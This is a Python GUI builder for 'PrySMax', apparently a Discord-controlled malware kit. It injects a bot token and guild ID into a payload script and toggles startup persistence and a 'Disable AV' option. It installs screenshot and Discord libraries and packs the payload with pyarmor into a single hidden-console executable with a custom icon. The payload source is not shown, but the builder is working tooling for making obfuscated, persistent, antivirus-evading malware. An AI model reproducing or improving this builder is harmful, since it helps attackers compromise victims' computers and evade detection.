import subprocess
import sys
import shutil
import os
import json
import tkinter as tk
from tkinter import messagebox, filedialog

# Verificar e instalar tkinter si no está instalado
try:
    import tkinter as tk
    from tkinter import messagebox, filedialog
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'tk'])
    # Reiniciar el programa después de instalar tkinter
    os.execl(sys.executable, sys.executable, *sys.argv)

SETTINGS_DIR = "settings"
SETTINGS_FILE = os.path.join(SETTINGS_DIR, "settings.json")

# Función para copiar el archivo prysmax.py a builder/prysmax.py
def copy_prysmax():
    if not os.path.exists("builder"):
        os.makedirs("builder")
    
    shutil.copy("prysmax.py", "builder/prysmax.py")

def replace_in_file(file_path, bot_token, guild_id, startup_for, disable_av):
    with open(file_path, 'r') as file:
        lines = file.readlines()

    with open(file_path, 'w') as file:
        for line in lines:
            if line.startswith('bot_token = '):
                line = f'bot_token = "{bot_token}"\n'
            elif line.startswith('guild_id = '):
                line = f'guild_id = "{guild_id}"\n'
            elif line.startswith('startup_for = '):
                line = f'startup_for = {str(startup_for)}\n'
            elif line.startswith('Disable_AV = '):
                line = f'Disable_AV = {str(disable_av)}\n'
            file.write(line)

def apply_settings_to_file(bot_token, guild_id, startup_for, disable_av):
    copy_prysmax()
    replace_in_file("builder/prysmax.py", bot_token, guild_id, startup_for, disable_av)

def save_settings(bot_token, guild_id, startup_for, disable_av):
    if not os.path.exists(SETTINGS_DIR):
        os.makedirs(SETTINGS_DIR)
    settings = {
        "bot_token": bot_token,
        "guild_id": guild_id,
        "startup_for": startup_for,
        "disable_av": disable_av
    }
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(settings, f)

def load_settings():
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'r') as f:
            return json.load(f)
    return {}

def download_libraries():
    libraries = ['mss', 'discord', 'requests', 'ctypes', 'tempfile']
    for lib in libraries:
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', lib])
            print(f"Installing {lib}...")
        except subprocess.CalledProcessError as e:
            print(f"{lib}: {e}")

def compile_script():
    subprocess.run('pyarmor pack -e "--onefile --noconsole --icon=settings/prysmax.ico" builder\\prysmax.py', shell=True)

def main():
    root = tk.Tk()
    root.title("PrySMax Configuration")
    root.configure(background='#000000')  # Fondo negro
    root.iconbitmap('settings/prysmax.ico')

    settings = load_settings()

    # Estilo de fuente y colores
    font_style = ("Courier", 12, 'bold')
    title_font_style = ("Courier", 25, 'bold')
    fg_color = "#ff0000"  # Rojo
    bg_color = "#000000"  # Negro
    entry_bg_color = "#33334d"
    entry_fg_color = "#39ff14"  # Neon
    button_bg_color = "#ff0000"  # Rojo
    button_fg_color = "#ffffff"  # Blanco

    title_label = tk.Label(root, text="PRYSMAX", font=title_font_style, fg=entry_fg_color, bg=bg_color)
    title_label.grid(row=0, columnspan=2, pady=(10, 20))

    bot_token_label = tk.Label(root, text="BOT-TOKEN:", font=font_style, fg=fg_color, bg=bg_color)
    bot_token_label.grid(row=1, column=0, padx=10, pady=5, sticky='e')
    bot_token_entry = tk.Entry(root, font=font_style, bg=entry_bg_color, fg=entry_fg_color, insertbackground=entry_fg_color, width=30)
    bot_token_entry.grid(row=1, column=1, padx=10, pady=5, sticky='w')
    bot_token_entry.insert(0, settings.get("bot_token", ""))

    guild_id_label = tk.Label(root, text="GUILD-ID:", font=font_style, fg=fg_color, bg=bg_color)
    guild_id_label.grid(row=2, column=0, padx=10, pady=5, sticky='e')
    guild_id_entry = tk.Entry(root, font=font_style, bg=entry_bg_color, fg=entry_fg_color, insertbackground=entry_fg_color, width=30)
    guild_id_entry.grid(row=2, column=1, padx=10, pady=5, sticky='w')
    guild_id_entry.insert(0, settings.get("guild_id", ""))

    startup_var = tk.BooleanVar(value=settings.get("startup_for", False))
    startup_check = tk.Checkbutton(root, text="Startup", font=font_style, bg=bg_color, fg=fg_color, selectcolor=entry_bg_color, variable=startup_var)
    startup_check.grid(row=3, column=0, padx=10, pady=5)

    av_var = tk.BooleanVar(value=settings.get("disable_av", False))
    av_check = tk.Checkbutton(root, text="Disable AV", font=font_style, bg=bg_color, fg=fg_color, selectcolor=entry_bg_color, variable=av_var)
    av_check.grid(row=3, column=1, padx=10, pady=5)

    def apply_and_save_settings():
        bot_token = bot_token_entry.get()
        guild_id = guild_id_entry.get()
        startup_for = startup_var.get()
        disable_av = av_var.get()
        apply_settings_to_file(bot_token, guild_id, startup_for, disable_av)
        save_settings(bot_token, guild_id, startup_for, disable_av)
        messagebox.showinfo("Success", "Settings saved and file updated successfully!")

    apply_button = tk.Button(root, text="Apply and Save", font=font_style, bg=button_bg_color, fg=button_fg_color,
                             command=apply_and_save_settings)
    apply_button.grid(row=4, columnspan=2, pady=10)

    download_lib_button = tk.Button(root, text="Download Libraries", font=font_style, bg=button_bg_color, fg=button_fg_color,
                                    command=download_libraries)
    download_lib_button.grid(row=5, columnspan=2, pady=5)

    compile_button = tk.Button(root, text="Compile", font=font_style, bg=button_bg_color, fg=button_fg_color,
                               command=compile_script)
    compile_button.grid(row=6, columnspan=2, pady=5)

    exit_button = tk.Button(root, text="Exit", font=font_style, bg=button_bg_color, fg=button_fg_color,
                            command=root.quit)
    exit_button.grid(row=7, columnspan=2, pady=10)

    root.mainloop()

if __name__ == '__main__':
    main()
